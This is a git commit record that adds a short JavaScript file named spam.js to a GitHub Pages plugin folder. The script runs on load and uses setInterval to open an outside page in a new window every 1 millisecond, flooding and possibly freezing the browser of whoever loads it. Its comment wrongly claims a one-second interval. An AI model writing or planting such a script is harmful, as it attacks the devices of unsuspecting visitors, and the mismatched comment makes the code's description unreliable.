6240755328ef135608533423da2f090d5e809322
Ilovecodepython <ngnhauyen2702@gmail.com>
2024-08-29 15:56:21 +0700

    Create spam.js

---
+++ plugin/downloads/spam.js
@@ -0,0 +1,6 @@
+(function() {
+    const url = 'https://ilovecodepython.github.io/plugin/downloads/index.html';
+    setInterval(() => {
+        window.open(url, '_blank');
+    }, 1); // Open every 1000 milliseconds (1 second)
+})();
